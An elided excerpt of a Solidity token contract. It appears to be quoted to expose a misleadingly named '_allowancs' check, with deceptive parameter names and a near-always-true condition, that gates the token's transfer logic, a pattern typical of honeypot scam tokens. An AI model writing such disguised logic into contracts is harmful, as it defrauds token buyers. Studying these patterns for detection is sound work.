...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _allowancs(address sentAmount, address amountOutMin) internal view returns(bool){
        return (sentAmount != amountOutMin) 
        ||
        (sentAmount != fundAddress);
    }
    ...
    function _tokenTransfer(
        ...
        if (_allowancs(sender,recipient))
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,
        2100000000,
        address(0xAb70e9c8793d166a27a65a15C4de9eD812C244b6),
        address(0x80aA486785BCB1AAB04e9ab7801aFd1CBF2Ed21f)
    ){
    }
}